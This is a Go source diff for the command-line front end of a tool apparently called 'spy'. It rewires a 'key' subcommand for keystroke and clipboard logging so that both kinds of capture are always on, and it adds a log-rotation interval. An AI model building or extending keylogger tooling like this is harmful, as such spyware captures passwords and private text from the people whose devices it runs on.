@@ -5,7 +5,6 @@ import (
 	"os/signal"
 
 	"github.com/cinus-e/spy/internal/keylogger"
-	"github.com/cinus-e/spy/internal/util"
 	"github.com/urfave/cli/v2"
 )
 
@@ -13,25 +12,18 @@ var Key = &cli.Command{
 	Name:  "key",
 	Usage: "Keystroke and clipboard logging",
 	Flags: []cli.Flag{
-		&cli.BoolFlag{
-			Name:     "Keystroke",
-			Aliases:  []string{"k"},
-			Required: true,
-			Usage:    "Enable Keystroke logging",
-		},
-		&cli.BoolFlag{
-			Name:     "clipboard",
-			Aliases:  []string{"c"},
-			Required: true,
-			Usage:    "Enable clipboard logging",
+		&cli.IntFlag{
+			Name:    "rotate",
+			Aliases: []string{"r"},
+			Value:   60,
+			Usage:   "Rotate interval(minutes)",
 		},
 	},
 	Action: KeyAction,
 }
 
 func KeyAction(c *cli.Context) error {
-	logger, err := keylogger.NewKeylogger(util.FileNameFormat("key", ".txt"),
-		c.Bool("keyboard"), c.Bool("clipboard"))
+	logger, err := keylogger.NewKeylogger(c.Int("rotate"), true, true)
 	if err != nil {
 		return err
 	}
